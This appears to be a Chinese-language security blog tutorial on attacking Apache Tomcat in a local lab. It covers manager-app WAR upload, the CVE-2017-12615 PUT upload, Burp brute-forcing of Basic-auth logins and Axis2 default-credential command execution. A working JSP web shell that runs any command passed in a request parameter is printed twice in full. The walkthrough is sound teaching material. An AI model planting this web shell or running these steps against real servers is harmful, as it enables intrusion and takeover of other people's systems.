---
title: Tomcat 安全问题
date: 2018-09-21 18:13:23
tags:
		- Tomcat
categories:
		- 安全研究
---

Tomcat 安全问题

<!-- more -->

### 前言

最近遇到客户的很多系统使用Tomcat服务器，于是科普一下关于Tomcat漏洞的知识。

### Tomcat 简介

[Tomcat](https://tomcat.apache.org/)

百科：Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用[服务器](https://baike.baidu.com/item/%E6%9C%8D%E5%8A%A1%E5%99%A8)，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。

下载需要的版本，windows下，启动`\bin\startup.bat`，默认端口是8080，通过修改`\conf\server.xml`配置文件，改变默认端口为8000。

 -->  
 <Connector port="8000" protocol="HTTP/1.1"  
 connectionTimeout="20000"  
 redirectPort="8443" />

访问`http://127.0.0.1:8000/`

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-14/41285460.jpg)

可以看到右边有三个选项

1.  **Server Status**
    
2.  **Manager App**
    
3.  **Host Manager**
    

点击访问一下。![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-14/69979479.jpg)

提示输入用户名和密码。需要将进行配置才能输入进入管理界面。

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-14/83403269.jpg)

看到需要配置`conf/tomcat-users.xml`文件。四种不同的角色权限。

-   manager-gui - allows access to the HTML GUI and the status pages
    
-   manager-script - allows access to the text interface and the status pages
    
-   manager-jmx - allows access to the JMX proxy and the status pages
    
-   manager-status - allows access to the status pages only
    

这篇文章写的很好。# Tomcat Manager用户配置详解[http://www.365mini.com/page/tomcat-manager-user-configuration.htm](http://www.365mini.com/page/tomcat-manager-user-configuration.htm)

Tomcat Manager是Tomcat自带的、用于对Tomcat自身以及部署在Tomcat上的应用进行管理的web应用。Tomcat是Java领域使用最广泛的服务器之一，因此Tomcat Manager也成为了使用非常普遍的功能应用。

在默认情况下，Tomcat Manager是处于禁用状态的。准确地说，Tomcat Manager需要以用户角色进行登录并授权才能使用相应的功能，不过Tomcat并没有配置任何默认的用户，因此需要我们进行相应的用户配置之后才能使用Tomcat Manager。

在`conf/tomcat-users.xml`添加以下内容，重启服务。

```
<role rolename="admin"/>  
<role rolename="admin-gui"/>  
<role rolename="admin-script"/>  
<role rolename="manager-gui"/>  
<role rolename="manager-script"/>  
<role rolename="manager-jmx"/>  
<role rolename="manager-status"/>  
<user username="admin" password="admin" roles="admin,admin-gui,admin-script,manager-gui,manager-script,manager-jmx,manager-status"/>

```


再次访问，输入用户名和密码，就可以进来了。![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-14/76689927.jpg)

### Tomcat getshell 1

既然进来了，就要考虑怎么getshell。

选择`Manager App`![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-14/9748128.jpg)

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-14/76689927.jpg)

**上传War包**

先将jsp马压缩为zip，再将zip后缀改名为war，然后上传war包。

本次上传的为xima.jsp。

```
<%  
if("023".equals(request.getParameter("pwd"))){  
 java.io.InputStream in =   
 Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();  
 int a = -1;  
 byte[] b = new byte[2048];  
 out.print("<pre>");  
 while((a=in.read(b)) !=1){  
 out.println(new String(b));  
 }  
 out.print("</pre>");  
}  
%>

```

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-14/8954479.jpg)

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-14/17014498.jpg)

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-14/74839062.jpg)

### Tomcat CVE-2017-12615 Getshell

影响版本：**7.0.0 to 7.0.79**

默认配置不受影响。留后门利用的话，需要修改默认配置文件，如下。

修改配置文件 `conf\server.xml`

添加以下内容

<init-param>  
 <param-name>readonly</param-name>  
 <param-value>false</param-value>  
 </init-param>

### 漏洞利用条件

CVE-2017-12615 需要将readonly初始化参数由默认值设置为false。但是Tomcat7.x版本中的`web.xml`配置文件中没有`readonly`参数，需要手工添加，默认配置不受此漏洞影响。

**版本--7.0.81**

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/17-9-21/6879452.jpg)

上传的时候出现，403禁止。。

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/17-9-21/49583998.jpg)

**版本--7.0.79**

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/17-9-21/71751989.jpg)

-   put请求，上传内容
    

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/17-9-21/68481146.jpg)

-   访问
    

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/17-9-21/13765510.jpg)

-   上传一木马

```
    
    <% if("023".equals(request.getParameter("pwd"))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print("<pre>"); while((a=in.read(b)) !=1){ out.println(new String(b)); } out.print("</pre>"); } %>
    
```

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/17-9-21/96541990.jpg)

### Tomcat 爆破

登录处进行抓包。![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-15/16485310.jpg)

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-15/48292404.jpg)

其中 `Authorization: Basic dGVzdDp0ZXN0` 是认证的数据。Base64解码可以看到：`test:test`![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-15/38129101.jpg)

认证方式为： `username:passwd`用户名，冒号，密码。

使用`Burp`进行爆破。

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-15/57948786.jpg)

设置`payload`

`payload type`选择`Custom iterator`，自定义爆破密码类型。

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-15/46531074.jpg)

设置第一组payload为账号。![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-15/43433305.jpg)第二组payload为冒号。![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-15/95494344.jpg)第三组payload为密码。![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-15/54873543.jpg)还有对设置的`payload`进行`base64`加密。

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-15/359506.jpg)

在最后的`Payload Encoding`中可以选择是否urlencode加密特殊字符，基础认证是不需要urlencode的，所以可以取消掉这个对号。![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-15/94820632.jpg)

开始爆破。可以看到200爆破成功了，然后就可以登录进去部署shell了。实战中，需要依靠强大的字典。![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-15/34369179.jpg)

### Axis2 getshell

百科：AXIS2 不只为WEB应用程式提供Web服务的接口，而且它也可以作为一个单独的服务器看待，而且很简单就能跟[Apache Tomcat](https://baike.baidu.com/item/Apache%20Tomcat)整合。下载地址[http://axis.apache.org/axis2/java/core/download.html](http://axis.apache.org/axis2/java/core/download.html)

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-15/65156900.jpg)

下载后，解压，将`axis2.war`放到Tomcat的`\webapps`目录下。访问：[http://127.0.0.1:8000/axis2/axis2-web/](http://127.0.0.1:8000/axis2/axis2-web/)

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-15/10516793.jpg)

默认的管理员以及密码：admin/axis2

登录进来：![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-15/28610566.jpg)

参考getshell：[http://javaweb.org/?p=1548](http://javaweb.org/?p=1548)点击左侧“Upload Service”上传cat.arr。![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-15/44153330.jpg)

部署成功后切到：Available Services(可用的services)。![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-15/39672229.jpg)

利用上传上去的文件来执行命令。`http://127.0.0.1:8000/axis2/services/Cat/exec?cmd=whoami`![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-8-15/41597270.jpg)

### Tomcat 聚合

[http://www.365mini.com/page/tomcat-manager-user-configuration.htm](http://www.365mini.com/page/tomcat-manager-user-configuration.htm)

[https://blog.csdn.net/weixian52034/article/details/53218584](https://blog.csdn.net/weixian52034/article/details/53218584)
[https://blog.csdn.net/kkgbn/article/details/52071109](https://blog.csdn.net/kkgbn/article/details/52071109)
[https://tomcat.apache.org/](https://tomcat.apache.org/)
[https://weibo.com/ttarticle/p/show?id=2309351002704074472985516075](https://weibo.com/ttarticle/p/show?id=2309351002704074472985516075)
[https://mp.weixin.qq.com/s/-dgcKKCjT8C2yDxMOXDyLA](https://mp.weixin.qq.com/s/-dgcKKCjT8C2yDxMOXDyLA)
[http://javaweb.org/?p=567](http://javaweb.org/?p=567)
[https://www.hackersb.cn/hacker/183.html](https://www.hackersb.cn/hacker/183.html)
[http://blog.51cto.com/nekesec/1746874](http://blog.51cto.com/nekesec/1746874)
[http://javaweb.org/?p=1548](http://javaweb.org/?p=1548)
[https://www.aliyun.com/jiaocheng/546247.html](https://www.aliyun.com/jiaocheng/546247.html)
[https://www.bodkin.ren/index.php/archives/27/](https://www.bodkin.ren/index.php/archives/27/)
